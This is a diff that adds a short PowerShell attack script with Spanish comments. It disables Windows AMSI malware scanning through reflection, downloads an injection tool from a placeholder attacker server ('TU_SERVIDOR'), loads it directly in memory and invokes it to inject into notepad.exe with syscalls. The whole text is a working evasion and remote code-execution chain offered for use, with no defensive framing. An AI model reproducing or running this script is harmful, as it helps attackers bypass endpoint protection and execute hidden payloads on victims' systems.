@@ -1,0 +1,10 @@
+# AMSI bypass
+$a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*AmsiUtils" }
+$f = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
+$f.SetValue($null, [IntPtr]::Zero)
+
+# Descargar y cargar SRPI directamente desde memoria
+$url = "http://TU_SERVIDOR/SharpReflectivePEInjection.exe"
+$bytes = (New-Object Net.WebClient).DownloadData($url)
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm.EntryPoint.Invoke($null, @(,@("-file", "C:\Windows\System32\notepad.exe", "-syscalls")))
